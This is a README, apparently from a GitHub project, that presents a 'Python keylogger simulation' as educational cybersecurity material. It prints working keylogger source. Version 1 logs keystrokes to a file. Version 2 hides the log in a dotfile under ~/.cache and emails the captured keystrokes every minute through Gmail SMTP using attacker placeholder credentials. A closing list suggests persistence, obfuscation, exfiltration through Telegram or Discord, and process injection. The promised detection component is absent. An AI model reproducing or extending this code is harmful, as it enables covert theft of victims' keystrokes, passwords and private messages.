<h1 align="center">🕵️‍♂️ Python Keylogger Simulation (Educational Project)</h1>
<p align="center"><b>Learn Offensive → Build Stronger Defense</b><br><i>Understand how attackers operate & how defenders respond</i></p>

<p align="center">
  <img src="https://img.shields.io/badge/Purpose-Educational-blue">
  <img src="https://img.shields.io/badge/Language-Python%203.x-green">
  <img src="https://img.shields.io/badge/Status-Active-orange">
  <img src="https://img.shields.io/badge/License-Ethical%20Use-red">
</p>

<hr>

<h2>🎯 About This Project</h2>
<p>
This project simulates how keyloggers work — one of the oldest cyber-attack techniques — and more importantly, how they can be <b>detected and defended</b> against.
<br><br>
🧠 <b>Goal:</b> Understand attacker behavior to build stronger Blue Team defense tools.<br>
⚠️ <b>Disclaimer:</b> Strictly for <b>educational and research purposes only</b>.
</p>

<hr>

<h2>📦 Project Versions</h2>

<table>
  <thead>
    <tr><th>Version</th><th>Description</th></tr>
  </thead>
  <tbody>
    <tr><td><b>v1</b></td><td>Basic keylogger — captures keystrokes and saves them to <code>keylog.txt</code></td></tr>
    <tr><td><b>v2</b></td><td>Advanced keylogger — captures keystrokes, exfiltrates via email, and stores hidden backup</td></tr>
    <tr><td><b>v3</b></td><td><i>Coming soon:</i> Real-time dynamic detection script & YARA rule for static detection</td></tr>
  </tbody>
</table>

<hr>

<h2>📄 Code Examples & Explanation</h2>

<h3>🔥 Version 1 — Basic Keylogger</h3>

<pre>
<code>
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f" [{key}] ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
</code>
</pre>

<p><b>📝 Explanation:</b><br>
A simple keylogger that logs keystrokes to <code>keylog.txt</code>. Uses the <code>pynput</code> library. Special keys like Enter or Space are recorded in brackets.
</p>

<br>

<h3>🔥 Version 2 — Keylogger with Email Exfiltration</h3>

<pre>
<code>
import pynput.keyboard
import threading
import smtplib
import os

log = ""
log_dir = os.path.expanduser("~/.cache")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".syslog_hidden")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

def send_mail():
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login("attackerEmail@gmail.com", "attackerPassword")
            server.sendmail("attackerEmail@gmail.com", "attackerEmail@gmail.com", log)
            server.quit()
        except:
            pass
        with open(log_file, "a") as f:
            f.write(log + "\n")
        log = ""

    timer = threading.Timer(60, send_mail)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()
send_mail()
keyboard_listener.join()
</code>
</pre>

<p><b>📝 Explanation:</b><br>
This version sends keystroke logs to an attacker email every 60 seconds using <code>smtplib</code>. Logs are also stored in a hidden backup file <code>.syslog_hidden</code> in the <code>.cache</code> directory.
</p>

<hr>

<h2>💡 Future Enhancements (Advanced Keylogging Concepts)</h2>
<ul>
  <li>Persistence: auto-run on startup via registry or startup folder</li>
  <li>Obfuscation: Base64 encode or pack with PyInstaller</li>
  <li>Network exfiltration: send logs via Telegram or Discord</li>
  <li>Process injection techniques (advanced evasion)</li>
  <li>Real-time detection with process monitoring (Blue Team)</li>
</ul>

<hr>

<h2>☕ Support My Cybersecurity Learning Journey</h2>

<p align="center">
  <a href="https://buymeacoffee.com/sudersen" target="_blank">
    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="Buy Me A Coffee" />
  </a>
</p>

<hr>

<h2>⚠️ Disclaimer</h2>
<p>
This project is for <b>educational and ethical cybersecurity training purposes only</b>.<br>
Do not use this script in any unauthorized environment. Misuse is a violation of law and professional ethics.
</p>

<hr>

<h2>📬 Let's Connect</h2>
<ul>
  <li>🔗 <a href="https://www.linkedin.com/in/drsudersen" target="_blank">LinkedIn: Dr. Sudersen</a></li>
  <li>☕ <a href="https://buymeacoffee.com/sudersen" target="_blank">Buy Me a Coffee</a></li>
</ul>
